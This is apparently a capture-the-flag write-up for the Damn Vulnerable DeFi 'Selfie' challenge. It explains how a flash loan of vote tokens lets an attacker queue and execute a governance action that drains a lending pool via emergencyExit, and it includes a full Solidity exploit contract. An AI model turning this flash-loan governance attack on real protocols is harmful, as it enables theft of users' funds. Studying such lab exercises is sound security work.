# Notes

The goal is to drain all the funds from the `SelfiePool`. A very interesting function for that is:

```solidity
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}
```

The problem, of course, is how to bypass the `onlyGovernance` modifier:

```solidity
modifier onlyGovernance() {
    if (msg.sender != address(governance)) {
        revert CallerNotGovernance();
    }
    _;
}
```

Okay, so considering there's a flashloan function, there might be a way to exploit it to somehow trigger a function call on a target contract or do something sneaky. Let's dig in:

```solidity
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
    external
    nonReentrant
    returns (bool)
{
    if (_token != address(token)) {
        revert UnsupportedCurrency();
    }

    token.transfer(address(_receiver), _amount);
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    if (!token.transferFrom(address(_receiver), address(this), _amount)) {
        revert RepayFailed();
    }

    return true;
}
```

In the governance contract, in order to perform actions, you need to have enough “vote” tokens, and looking at the deployment we can see that the vote token is the same as the one used by the pool:

```solidity
// Deploy token
token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

// Deploy governance contract
governance = new SimpleGovernance(token);

// Deploy pool
pool = new SelfiePool(token, governance);

// Fund the pool
```

So that means with the flashloan we can temporarily hold a majority of the votes in a single transaction!

From there, we can flashloan -> request the `SimpleGovernance` contract to queue an action:

```solidity
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {                 // <---- this is where we need the majority
            revert NotEnoughVotes(msg.sender);
        }

        if (target == address(this)) {
            revert InvalidTarget();
        }

        if (data.length > 0 && target.code.length == 0) {
            revert TargetMustHaveCode();
        }

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked {
            _actionCounter++;
        }

        emit ActionQueued(actionId, msg.sender);
    }
```

```solidity
function executeAction(uint256 actionId) external payable returns (bytes memory) {
    if (!_canBeExecuted(actionId)) {               
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}
```

So in the end, it will call **any** function on **any** contract with **any** parameters.

So the exploit chain would look like this:

- Flashloan to gain majority of the voting power (note: we need to delegate() tokens to be considerated in getVotes())
- Propose a new action: call `emergencyExit()` with our address as the recipient
- Wait for the delay (foundry cheatcode)
- Execute the action

## Exploit

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/selfie/SelfiePool.sol";
import "../../src/selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";


contract ExploitHelper is IERC3156FlashBorrower {
    address public owner;
    SelfiePool public pool;
    SimpleGovernance public governance;
    IERC20 public token;
    uint256 public actionId;
    address recovery;

    constructor(address _recovery, address _pool, address _governance, address _token) {
        owner = msg.sender;
        recovery = _recovery;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = IERC20(_token);
    }

    function initiateAttack() external {
        require(msg.sender == owner, "Not owner");
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, "");
    }

    // Called during the flashloan
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);

        ERC20Votes(address(token)).delegate(address(this));

        actionId = governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function getActionId() external view returns (uint256) {
        return actionId;
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}
```